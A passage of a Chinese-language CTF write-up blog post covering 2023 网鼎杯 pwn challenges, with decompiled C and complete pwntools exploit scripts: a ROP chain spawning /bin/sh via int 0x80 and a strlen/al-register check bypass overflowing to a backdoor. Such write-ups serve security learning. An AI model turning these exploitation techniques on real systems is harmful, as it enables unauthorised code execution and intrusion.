gdb.attach(io,&#x27;b *0x8048935&#x27;)</span></span><br><span class="line"><span class="comment"># pause(0)</span></span><br><span class="line">io.sendline(payload)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
+
+<h1 id="pwn3"><a href="#pwn3" class="headerlink" title="pwn3"></a>pwn3</h1><p>一开始还以为是个手写可见字符shellcode 但是转念一想 反正保护全关 也有很长的栈溢出 那就可以直接打呗</p>
+<p>静态编译的程序一般都是打系统调用的 这里太久没做了 还卡住了 忘记32位的系统调用是int 0x80了 傻傻的用syscall打了半天</p>
+<p><a target="_blank" rel="noopener" href="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202305161330928.png" title="image-20230516133039836" class="gallery-item"><img src="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202305161330928.png" alt="image-20230516133039836"></a></p>
+<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> __cdecl __noreturn <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  init();</span><br><span class="line">  <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">    vuln();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">vuln</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> v0; <span class="comment">// eax</span></span><br><span class="line">  <span class="type">char</span> v2[<span class="number">96</span>]; <span class="comment">// [esp+8h] [ebp-70h] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> j; <span class="comment">// [esp+68h] [ebp-10h]</span></span><br><span class="line">  <span class="type">int</span> i; <span class="comment">// [esp+6Ch] [ebp-Ch]</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;please input what you want say&quot;</span>);</span><br><span class="line">  read_len = read(<span class="number">0</span>, v2, <span class="number">288</span>);</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt; read_len; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">for</span> ( j = <span class="number">0</span>; ; ++j )</span><br><span class="line">    &#123;</span><br><span class="line">      v0 = <span class="built_in">strlen</span>(byte_80EB068);</span><br><span class="line">      <span class="keyword">if</span> ( v0 &lt;= j )</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">if</span> ( v2[i] == *(j + <span class="number">0x80EB068</span>) )</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">puts</span>(v2);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>对于输入的字符进行了一个检查 如果为BINSHbinsh就exit</p>
+<p>不过不影响 直接构造rop链 往bss段写binsh 随后execve系统调用就好了</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line"><span class="keyword">from</span> ctypes <span class="keyword">import</span> *</span><br><span class="line">io = process(<span class="string">&quot;./pwn&quot;</span>)</span><br><span class="line"><span class="comment">#io = remote(&quot;node5.anna.nssctf.cn&quot;,28881)</span></span><br><span class="line">elf = ELF(<span class="string">&quot;./pwn&quot;</span>)</span><br><span class="line">context.terminal = [<span class="string">&#x27;tmux&#x27;</span>,<span class="string">&#x27;splitw&#x27;</span>,<span class="string">&#x27;-h&#x27;</span>]</span><br><span class="line"><span class="comment">#libc = ELF(&quot;./ld-linux.so.2&quot;)</span></span><br><span class="line">libc = ELF(<span class="string">&quot;/home/chen/glibc-all-in-one/libs/2.35-0ubuntu3.1_amd64/libc.so.6&quot;</span>)</span><br><span class="line"><span class="comment">#libc = cdll.LoadLibrary(&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;)</span></span><br><span class="line">context.arch = <span class="string">&quot;amd64&quot;</span></span><br><span class="line">context.log_level = <span class="string">&quot;debug&quot;</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">debug</span>():</span><br><span class="line">    gdb.attach(io)</span><br><span class="line">    pause()</span><br><span class="line"></span><br><span class="line">io.recvuntil(<span class="string">&quot;please input what you want say&quot;</span>)</span><br><span class="line">edi_addr = <span class="number">0x08048480</span></span><br><span class="line">eax_addr = <span class="number">0x080b8f16</span></span><br><span class="line">ebx_addr = <span class="number">0x080481c9</span></span><br><span class="line">ecx_addr = <span class="number">0x080df91d</span> </span><br><span class="line">edx_addr = <span class="number">0x0806f89b</span></span><br><span class="line">syscall_addr = <span class="number">0x0806331d</span></span><br><span class="line">sh_addr=  <span class="number">0x80EB070</span></span><br><span class="line">bss_addr = elf.bss(<span class="number">0x400</span>)</span><br><span class="line">read_addr = <span class="number">0x806DE00</span></span><br><span class="line">main_addr = <span class="number">0x8048972</span></span><br><span class="line">int80_addr =<span class="number">0x0806d4a3</span></span><br><span class="line">payload = <span class="string">b&#x27;e&#x27;</span>*<span class="number">0x74</span>+p32(read_addr)+p32(main_addr)+p32(<span class="number">0</span>)+p32(bss_addr)+p32(<span class="number">0x20</span>)</span><br><span class="line"><span class="comment"># gdb.attach(io,&#x27;b *0x8048971 &#x27;)</span></span><br><span class="line"><span class="comment"># pause(0)</span></span><br><span class="line">io.send(payload)</span><br><span class="line"><span class="comment"># pause()</span></span><br><span class="line">io.send(<span class="string">b&#x27;/bin/sh\x00&#x27;</span>)</span><br><span class="line">io.recvuntil(<span class="string">&quot;please input what you want say&quot;</span>)</span><br><span class="line">payload = <span class="string">b&#x27;e&#x27;</span>*<span class="number">0x74</span>+p32(eax_addr)+p32(<span class="number">0xb</span>)+p32(ebx_addr)+p32(bss_addr)+p32(ecx_addr)+p32(<span class="number">0</span>)+p32(int80_addr)</span><br><span class="line"><span class="comment"># gdb.attach(io,&#x27;b *0x8048971 &#x27;)</span></span><br><span class="line"><span class="comment"># pause(0)</span></span><br><span class="line">io.send(payload)</span><br><span class="line"><span class="comment"># pause()</span></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
+
+<h1 id="pwn4"><a href="#pwn4" class="headerlink" title="pwn4"></a>pwn4</h1><p>依然是什么保护都没有开</p>
+<p><a target="_blank" rel="noopener" href="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202305162134515.png" title="image-20230516213436431" class="gallery-item"><img src="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202305162134515.png" alt="image-20230516213436431"></a></p>
+<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> __cdecl __noreturn <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  init();</span><br><span class="line">  <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">    vuln();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">vuln</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> v1[<span class="number">336</span>]; <span class="comment">// [esp+0h] [ebp-1B8h] BYREF</span></span><br><span class="line">  <span class="type">char</span> v2[<span class="number">104</span>]; <span class="comment">// [esp+150h] [ebp-68h] BYREF</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;please input your username&quot;</span>);</span><br><span class="line">  read(<span class="number">0</span>, v2, <span class="number">0x20</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;please input your passwd&quot;</span>);</span><br><span class="line">  read(<span class="number">0</span>, v1, <span class="number">0x14F</span>);</span><br><span class="line">  <span class="keyword">return</span> check(v1);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>没有栈溢出 v1作为check函数的参数 跟进一下</p>
+<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> __cdecl <span class="title function_">check</span><span class="params">(<span class="type">int</span> a1)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> result; <span class="comment">// eax</span></span><br><span class="line">  <span class="type">char</span> v2[<span class="number">16</span>]; <span class="comment">// [esp+Fh] [ebp-19h] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> __int8 v3; <span class="comment">// [esp+1Fh] [ebp-9h]</span></span><br><span class="line"></span><br><span class="line">  v3 = <span class="built_in">strlen</span>(a1);</span><br><span class="line">  <span class="keyword">if</span> ( v3 &gt; <span class="number">6u</span> &amp;&amp; v3 &lt;= <span class="number">8u</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;nice&quot;</span>);</span><br><span class="line">    result = <span class="built_in">strcpy</span>(v2, a1);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;passwd error&quot;</span>);</span><br><span class="line">    result = <span class="number">0</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>针对v1的长度进行了检测 只有7和8的时候可以调用strcpy进行栈溢出 这里一开始想的是直接\x00绕过strlen 后来意识到strcpy也会被绕过 这个时候注意到v3这个参数的异常 你可以发现其位于ebp-0x9 这个位置有点不对劲 所以切换成汇编看一下</p>
+<p><a target="_blank" rel="noopener" href="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202305162138395.png" title="image-20230516213802362" class="gallery-item"><img src="https://blog-1259781238.cos.ap-nanjing.myqcloud.com/202305162138395.png" alt="image-20230516213802362"></a></p>
+<p>strlen的返回值存储在eax中 而用来比较的是al寄存器的值 所以这里可以绕过</p>
+<p>原因就在于如果数值大一点 使得二进制形式的eax的1都位于高位 使得低八位的值比较小 就可以绕过了</p>
+<p>完整exp:</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line"><span class="keyword">from</span> ctypes <span class="keyword">import</span> *</span><br><span class="line">io = process(<span class="string">&quot;./pwn&quot;</span>)</span><br><span class="line"><span class="comment">#io = remote(&quot;node5.anna.nssctf.cn&quot;,28881)</span></span><br><span class="line">elf = ELF(<span class="string">&quot;./pwn&quot;</span>)</span><br><span class="line">context.terminal = [<span class="string">&#x27;tmux&#x27;</span>,<span class="string">&#x27;splitw&#x27;</span>,<span class="string">&#x27;-h&#x27;</span>]</span><br><span class="line"><span class="comment">#libc = ELF(&quot;./ld-linux.so.2&quot;)</span></span><br><span class="line">libc = ELF(<span class="string">&quot;/home/chen/glibc-all-in-one/libs/2.35-0ubuntu3.1_amd64/libc.so.6&quot;</span>)</span><br><span class="line"><span class="comment">#libc = cdll.LoadLibrary(&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;)</span></span><br><span class="line">context.arch = <span class="string">&quot;amd64&quot;</span></span><br><span class="line">context.log_level = <span class="string">&quot;debug&quot;</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">debug</span>():</span><br><span class="line">    gdb.attach(io)</span><br><span class="line">    pause()</span><br><span class="line"></span><br><span class="line">io.recvuntil(<span class="string">&quot;please input your username&quot;</span>)</span><br><span class="line">io.send(<span class="string">b&#x27;chen&#x27;</span>)</span><br><span class="line">io.recvuntil(<span class="string">&quot;please input your passwd&quot;</span>)</span><br><span class="line">backdoor_addr = <span class="number">0x80488CE</span></span><br><span class="line">payload = cyclic(<span class="number">0x19</span>+<span class="number">0x4</span>)+p32(backdoor_addr)+cyclic(<span class="number">0xe6</span>)</span><br><span class="line"><span class="comment"># gdb.attach(io,&#x27;b *0x80488FB&#x27;)</span></span><br><span class="line"><span class="comment"># pause(0)</span></span><br><span class="line">io.send(payload)</span><br><span class="line"><span class="comment"># pause()</span></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
+
+
+
+</div><script src="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/js/lightgallery.min.js"></script><script>if (typeof lightGallery !== 'undefined') {
+        var options = {
+            selector: '.gallery-item'
+        };
+        lightGallery(document.getElementsByClassName('.article-gallery')[0], options);
+        }</script>
+  </div>
+</article>
+
+    <div class="blog-post-comments">
+        <div id="disqus_thread">
+            <noscript>Please enable JavaScript to view the comments.</noscript>
+        </div>
+    </div>
+
+
+
+        
+          <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
+      <ul>
+        
+          <li><a href="/">Home</a></li>
+        
+          <li><a href="/about/">About</a></li>
+        
+          <li><a href="/archives/">Writing</a></li>
+        
+          <li><a href="/categories/">categories</a></li>
+        
+          <li><a href="/search/">Search</a></li>
+        
+      </ul>
+    </div>
+
+    
+    
+      <div id="toc-footer" style="display: none">
+        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#pwn1"><span class="toc-number">1.</span> <span class="toc-text">pwn1</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#pwn2"><span class="toc-number">2.</span> <span class="toc-text">pwn2</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#pwn3"><span class="toc-number">3.</span> <span class="toc-text">pwn3</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#pwn4"><span class="toc-number">4.</span> <span class="toc-text">pwn4</span></a></li></ol>
+      </div>
+    
+
+    <div id="share-footer" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=http://example.com/2023/04/20/2023%E7%BD%91%E9%BC%8E%E6%9D%AF/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=http://example.com/2023/04/20/2023%E7%BD%91%E9%BC%8E%E6%9D%AF/&text=2023网鼎杯"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=http://example.com/2023/04/20/2023%E7%BD%91%E9%BC%8E%E6%9D%AF/&title=2023网鼎杯"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=http://example.com/2023/04/20/2023%E7%BD%91%E9%BC%8E%E6%9D%AF/&is_video=false&description=2023网鼎杯"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=2023网鼎杯&body=Check out this article: http://example.com/2023/04/20/2023%E7%BD%91%E9%BC%8E%E6%9D%AF/"><i class="fa-solid fa-envelope fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=http://example.com/2023/04/20/2023%E7%BD%91%E9%BC%8E%E6%9D%AF/&title=2023网鼎杯"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=http://example.com/2023/04/20/2023%E7%BD%91%E9%BC%8E%E6%9D%AF/&title=2023网鼎杯"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=http://example.com/2023/04/20/2023%E7%BD%91%E9%BC%8E%E6%9D%AF/&title=2023网鼎杯"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=http://example.com/2023/04/20/2023%E7%BD%91%E9%BC%8E%E6%9D%AF/&title=2023网鼎杯"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=http://example.com/2023/04/20/2023%E7%BD%91%E9%BC%8E%E6%9D%AF/&name=2023网鼎杯&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=http://example.com/2023/04/20/2023%E7%BD%91%E9%BC%8E%E6%9D%AF/&t=2023网鼎杯"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+
+    <div id="actions-footer">
+        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fa-solid fa-bars fa-lg" aria-hidden="true"></i> Menu</a>
+        
+          <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fa-solid fa-list fa-lg" aria-hidden="true"></i> TOC</a>
+        
+        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fa-solid fa-share-alt fa-lg" aria-hidden="true"></i> Share</a>
+        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a>
+    </div>
+
+  </div>
+</div>
+
+        
+        <footer id="footer">
+  <div class="footer-left">
+    Copyright &copy;
+    
+    
+    2016-2023
+    C12en
+  </div>
+  <div class="footer-right">
+    <nav>
+      <ul>
+        <!--
+       --><li><a href="/">Home</a></li><!--
+     --><!--
+       --><li><a href="/about/">About</a></li><!--
+     --><!--
+       --><li><a href="/archives/">Writing</a></li><!--
+     --><!--
+       --><li><a href="/categories/">categories</a></li><!--
+     --><!--
+       --><li><a href="/search/">Search</a></li><!--
+     -->
+      </ul>
+    </nav>
+  </div>
+</footer>
+
+    </div>
+    <!-- styles -->
+
+
+
+  <link rel="preload" as="style" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" crossorigin="anonymous" onload="this.onload=null;this.rel='stylesheet'"/>
+
+
+    <!-- jquery -->
+
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js" crossorigin="anonymous"></script>
+
+
+
+
+<!-- clipboard -->
+
+  
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.7/clipboard.min.js" crossorigin="anonymous"></script>
+  
+  <script type="text/javascript">
+  $(function() {
+    // copy-btn HTML
+    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"Copy to clipboard!\">";
+    btn += '<i class="fa-regular fa-clone"></i>';
+    btn += '</span>';
+    // mount it!
+    $(".highlight table").before(btn);
+    var clip = new ClipboardJS('.btn-copy', {
+      text: function(trigger) {
+        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
+      }
+    });
+    clip.on('success', function(e) {
+      e.trigger.setAttribute('aria-label', "Copied!");
+      e.clearSelection();
+    })
+  })
+  </script>
+
+
+<script src="/js/main.js"></script>
+
+<!-- search -->
+
+<!-- Baidu Analytics -->
+
+<!-- Cloudflare Analytics -->
+
+<!-- Disqus Comments -->
+
+    <script type="text/javascript">
+        var disqus_shortname = 'c12en';
+
+        (function(){
+            var dsq = document.createElement('script');
+            dsq.type = 'text/javascript';
+            dsq.async = true;
+            dsq.src = '//' + disqus_shortname + '.disqus.com/embed.js';
+            (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
+        }());
+    </script>
+
+<!-- utterances Comments -->
+
+</body>
+</html>
